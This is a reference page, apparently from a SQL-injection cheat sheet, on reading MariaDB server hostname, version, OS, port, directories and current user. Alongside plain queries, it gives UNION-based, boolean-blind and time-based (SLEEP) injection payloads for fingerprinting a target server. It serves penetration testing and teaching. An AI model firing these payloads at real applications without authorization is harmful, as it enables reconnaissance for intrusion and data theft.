---
title: Server Hostname
description: How to retrieve the server hostname and system information in MariaDB
category: Information Gathering
order: 7
tags: ["hostname", "server information", "fingerprinting"]
lastUpdated: 2025-12-18
---

## Server Hostname

Retrieving the server hostname and system information can provide valuable intelligence about the target environment during SQL injection testing. This information can help with lateral movement or identifying specific servers in a network.

```sql
SELECT @@hostname
```

## Server Identification Variables

| Variable                    | Description                 | Example Value               |
| --------------------------- | --------------------------- | --------------------------- |
| `@@hostname`                | Server hostname             | `db-server-01`              |
| `@@version`                 | MariaDB version             | `10.6.20-MariaDB`           |
| `@@version_comment`         | Build/distribution info     | `MariaDB Server`            |
| `@@version_compile_os`      | OS compiled on              | `Linux`, `debian-linux-gnu` |
| `@@version_compile_machine` | CPU architecture            | `x86_64`, `aarch64`         |
| `@@server_id`               | Server ID (for replication) | `1`                         |

### Examples

```sql
-- Get hostname
SELECT @@hostname

-- Get version with OS info
SELECT @@version, @@version_compile_os

-- Get architecture
SELECT @@version_compile_machine

-- Get server ID (replication identifier)
SELECT @@server_id

-- Check if hostname exists in WHERE clause
SELECT 1 AS result FROM DUAL WHERE @@hostname IS NOT NULL

-- Use LIKE pattern to match hostname
SELECT @@hostname AS hostname FROM DUAL WHERE @@hostname LIKE '%'
```

## Network Configuration

| Variable         | Description      | Example Value                 |
| ---------------- | ---------------- | ----------------------------- |
| `@@port`         | Server port      | `3306`                        |
| `@@bind_address` | Bind address     | `0.0.0.0` or NULL             |
| `@@socket`       | Unix socket path | `/var/run/mysqld/mysqld.sock` |

### Examples

```sql
-- Get server port
SELECT @@port

-- Get bind address (may be NULL in containers)
SELECT @@bind_address

-- Get socket path
SELECT @@socket

-- Hostname:port format
SELECT CONCAT(@@hostname, ':', @@port) AS server
```

## Directory Configuration

| Variable             | Description            | Example Value                   |
| -------------------- | ---------------------- | ------------------------------- |
| `@@datadir`          | Data directory         | `/var/lib/mysql/`               |
| `@@basedir`          | Installation directory | `/usr/`                         |
| `@@tmpdir`           | Temporary directory    | `/tmp`                          |
| `@@secure_file_priv` | File I/O restriction   | `/var/lib/mysql-files/` or NULL |

### Examples

```sql
-- Get data directory (contains database files)
SELECT @@datadir

-- Get installation directory
SELECT @@basedir

-- Get temp directory
SELECT @@tmpdir

-- Check file operation restrictions
SELECT @@secure_file_priv
-- NULL = no restriction, empty = disabled, path = restricted to that path
```

## System Information Functions

| Function          | Description          | Example Output    |
| ----------------- | -------------------- | ----------------- |
| `VERSION()`       | MariaDB version      | `10.6.20-MariaDB` |
| `DATABASE()`      | Current database     | `vulndb`          |
| `USER()`          | Current user         | `root@localhost`  |
| `CURRENT_USER()`  | Authenticated user   | `root@%`          |
| `CONNECTION_ID()` | Thread/connection ID | `42`              |

### Examples

```sql
-- Get MariaDB version
SELECT VERSION()

-- Get current database name
SELECT DATABASE()

-- Get current user with host
SELECT USER()

-- Get authenticated user account
SELECT CURRENT_USER()

-- Get current connection/thread ID
SELECT CONNECTION_ID()
```

## UNION-Based Extraction

Extract server information via UNION injection:

```sql
-- Extract hostname
' UNION SELECT 1, @@hostname -- -

-- Extract version info
' UNION SELECT 1, CONCAT(@@version, ' on ', @@version_compile_os) -- -

-- Extract hostname:port
' UNION SELECT 1, CONCAT(@@hostname, ':', @@port) -- -

-- Subquery extraction
SELECT (SELECT @@hostname) AS hostname
```

### Full Query Examples

```sql
-- UNION SELECT hostname
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, @@hostname

-- UNION SELECT version and OS
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT(@@version, ' on ', @@version_compile_os)

-- UNION SELECT hostname:port format
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT(@@hostname, ':', @@port)
```

## Boolean-Based Extraction

Extract server information character-by-character:

```sql
-- Check if hostname has content
SELECT IF(LENGTH(@@hostname) > 0, 1, 0) AS result

-- Extract first character
SELECT SUBSTRING(@@hostname, 1, 1) AS first_char

-- Get ASCII value of first character
SELECT ASCII(SUBSTRING(@@hostname, 1, 1)) AS ascii_val

-- CASE expression
SELECT CASE
  WHEN @@hostname IS NOT NULL THEN 'has_hostname'
  ELSE 'no_hostname'
END AS result
```

### In Blind Injection Context

Use these techniques when you cannot see query results directly:

```sql
-- Check first character (boolean-based blind)
' AND SUBSTRING(@@hostname,1,1)='d' -- -

-- Check ASCII value (boolean-based blind)
' AND ASCII(SUBSTRING(@@hostname,1,1))=100 -- -

-- Check hostname length (boolean-based blind)
' AND LENGTH(@@hostname)=12 -- -
```

Note: These queries return true/false, allowing character-by-character hostname extraction through application behavior differences.

## Time-Based Extraction

Use time delays to extract hostname when no visible output or boolean feedback is available:

```sql
-- Delay if hostname starts with specific character
' AND IF(SUBSTRING(@@hostname,1,1)='d', SLEEP(5), 0) -- -

-- Delay based on ASCII value
' AND IF(ASCII(SUBSTRING(@@hostname,1,1))=100, SLEEP(5), 0) -- -

-- Delay if hostname length is specific value
' AND IF(LENGTH(@@hostname)=12, SLEEP(5), 0) -- -
```

Note: A 5-second delay indicates the condition is true. Use this for completely blind extraction scenarios.

## SHOW VARIABLES Alternative

```sql
-- Get hostname via SHOW VARIABLES
SHOW VARIABLES LIKE 'hostname'

-- Get version-related variables
SHOW VARIABLES LIKE 'version%'

-- Get port
SHOW VARIABLES LIKE 'port'

-- Get all directory-related variables (datadir, basedir, tmpdir, etc.)
SHOW VARIABLES LIKE '%dir%'
```

## information_schema Variables

MariaDB stores variables in information_schema tables:

```sql
-- Query hostname from global_variables
SELECT VARIABLE_VALUE FROM information_schema.global_variables
WHERE VARIABLE_NAME = 'HOSTNAME'

-- Query version from session_variables
SELECT VARIABLE_VALUE FROM information_schema.session_variables
WHERE VARIABLE_NAME = 'VERSION'
```

### In UNION Injection Context

```sql
-- Extract hostname via information_schema in UNION injection
' UNION SELECT 1, VARIABLE_VALUE FROM information_schema.global_variables WHERE VARIABLE_NAME = 'HOSTNAME' -- -

-- Extract version via information_schema
' UNION SELECT 1, VARIABLE_VALUE FROM information_schema.session_variables WHERE VARIABLE_NAME = 'VERSION' -- -
```

## Complete Server Fingerprinting

### Combined Query

```sql
SELECT
  @@hostname AS hostname,
  @@version AS version,
  @@version_compile_os AS os,
  @@version_compile_machine AS arch,
  @@port AS port,
  DATABASE() AS cur_db,
  USER() AS cur_user,
  @@server_id AS server_id
```

### Single-Column Extraction

Use GROUP_CONCAT when limited to single column output:

```sql
SELECT GROUP_CONCAT(
  @@hostname, '|',
  @@version, '|',
  @@port
) AS fingerprint
-- Returns: db-server|10.6.20-MariaDB|3306
```

### In UNION Injection

```sql
-- Extract full fingerprint in one query using GROUP_CONCAT
' UNION SELECT 1, GROUP_CONCAT(@@hostname,'|',@@version,'|',@@port) -- -

-- Full UNION query example with GROUP_CONCAT
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, GROUP_CONCAT(@@hostname,'|',@@version,'|',@@port)

-- Extract readable server description with CONCAT
' UNION SELECT 1, CONCAT(@@hostname,' running MariaDB ',@@version) -- -

-- Full UNION query example with CONCAT
SELECT id, username FROM users WHERE id = 999
UNION SELECT 1, CONCAT(@@hostname,' running MariaDB ',@@version)
```

## Practical Use Cases

### Identifying Server Environment

```sql
-- Check if running in Docker/container (hostname often randomized)
SELECT @@hostname

-- Check if Linux or Windows
SELECT @@version_compile_os

-- Check architecture (32-bit vs 64-bit)
SELECT @@version_compile_machine
```

### Comprehensive Reconnaissance Query

Use CONCAT_WS to format all server information with newline separators:

```sql
SELECT CONCAT_WS('\n',
  CONCAT('Hostname: ', @@hostname),
  CONCAT('Version: ', @@version),
  CONCAT('OS: ', @@version_compile_os),
  CONCAT('Arch: ', @@version_compile_machine),
  CONCAT('Port: ', @@port),
  CONCAT('Data Dir: ', @@datadir),
  CONCAT('User: ', USER())
) AS server_info
```

This produces formatted output like:

```text
Hostname: db-server-01
Version: 10.6.20-MariaDB
OS: debian-linux-gnu
Arch: x86_64
Port: 3306
Data Dir: /var/lib/mysql/
User: root@localhost
```
